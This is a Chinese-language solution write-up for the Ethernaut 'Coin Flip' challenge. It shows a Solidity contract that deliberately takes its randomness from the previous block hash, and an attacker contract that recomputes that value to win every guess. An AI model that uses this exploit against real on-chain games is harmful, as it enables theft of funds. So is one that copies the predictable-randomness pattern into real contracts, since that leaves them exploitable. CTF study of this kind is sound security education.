# Ethernaut 03-Coin Flip

## 本关目标

- 猜对合约游戏输出，连续赢 10 次

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins; // 记录连续胜利的次数
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  // 传入猜测的bool值，如果和随机生成的一致，则胜利一次
  function flip(bool _guess) public returns (bool) {
    // 使用区块链公共值进行计算
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## 解决方案

1. 由于 flip 中计算随机 side 值时使用的是区块链参数，并且 FACTOR 是一个开源的常量，在合约外部可以以相同的算法计算 side 并传入 flip()

```solidity
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlipCoin.sol";

contract Hack {
    CoinFlip private immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // 传入CoinFlip实例地址
    constructor(address _target) {
        target = CoinFlip(_target);
    }

    // 按照相同的算法计算猜测bool值
    function _guess() private view returns(bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

    // 连续调用10次该函数即可
    function flip() public {
        bool guess = _guess();
        bool res = target.flip(guess);
        require(res, "guess fail");
    }
}
```
